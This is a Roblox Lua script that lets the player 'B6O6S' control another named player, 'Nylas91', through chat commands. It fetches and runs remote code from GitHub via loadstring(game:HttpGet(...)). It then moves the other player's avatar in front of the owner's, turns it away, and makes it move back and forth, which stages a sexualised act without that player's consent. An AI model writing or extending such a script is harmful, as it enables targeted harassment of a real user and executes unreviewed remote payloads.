local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")

local MALE_URL = "https://raw.githubusercontent.com/B6O6S/Fun-mode/refs/heads/main/Male"
local FEMALE_URL = "https://raw.githubusercontent.com/B6O6S/Fun-mode/refs/heads/main/Female"

local FOLLOW_TARGET_NAME = "Nylas91"
local COMMAND_OWNER = "B6O6S"

local following = false
local pos1Active = false
local moveTime = 0

-- Load script + notify
local function loadScript(player, url)
    local success = pcall(function()
        loadstring(game:HttpGet(url))()
    end)

    if success then
        pcall(function()
            StarterGui:SetCore("SendNotification", {
                Title = "Fun Mode",
                Text = "Script loaded successfully!",
                Duration = 4
            })
        end)
    else
        warn("Failed to load script for", player.Name)
    end
end

-- Apply fun
local function applyFun()
    local b6o6s = Players:FindFirstChild(COMMAND_OWNER)
    local nylas = Players:FindFirstChild(FOLLOW_TARGET_NAME)
    if not b6o6s then return end

    loadScript(b6o6s, MALE_URL)
    loadScript(b6o6s, FEMALE_URL)

    if nylas then
        loadScript(nylas, FEMALE_URL)
        following = true
    end
end

local function stopFun()
    following = false
    pos1Active = false
end

local function resetAll()
    following = false
    pos1Active = false

    local b6o6s = Players:FindFirstChild(COMMAND_OWNER)
    local nylas = Players:FindFirstChild(FOLLOW_TARGET_NAME)

    if b6o6s then b6o6s:LoadCharacter() end
    if nylas then nylas:LoadCharacter() end
end

-- Chat listener
local function onChat(player, msg)
    msg = msg:lower()

    if player.Name ~= COMMAND_OWNER then return end

    if msg == "/fun" then
        applyFun()
    elseif msg == "/pos1" then
        pos1Active = true
        following = true
    elseif msg == "/unfun" then
        stopFun()
    elseif msg == "/re" then
        resetAll()
    end
end

-- Setup players
local function setup(player)
    player.Chatted:Connect(function(msg)
        onChat(player, msg)
    end)
end

for _, p in ipairs(Players:GetPlayers()) do
    setup(p)
end
Players.PlayerAdded:Connect(setup)

-- Follow + back & forth movement
RunService.Heartbeat:Connect(function(dt)
    if not following then return end

    local b6o6s = Players:FindFirstChild(COMMAND_OWNER)
    local nylas = Players:FindFirstChild(FOLLOW_TARGET_NAME)
    if not (b6o6s and nylas) then return end
    if not (b6o6s.Character and nylas.Character) then return end
    if not (b6o6s.Character.PrimaryPart and nylas.Character.PrimaryPart) then return end

    local bHRP = b6o6s.Character.PrimaryPart
    local nHRP = nylas.Character.PrimaryPart

    -- base position (1.7 studs in front)
    local baseCF = bHRP.CFrame * CFrame.new(0, 0, -1.7)

    -- back & forth movement when /pos1 is active
    local offset = 0
    if pos1Active then
        moveTime += dt
        offset = math.sin(moveTime * 3) * 0.4 -- movement distance
    end

    local finalPos = baseCF * CFrame.new(0, 0, offset)

    -- back facing B6O6S
    nHRP.CFrame = CFrame.new(
        finalPos.Position,
        finalPos.Position + bHRP.CFrame.LookVector
    )
end)
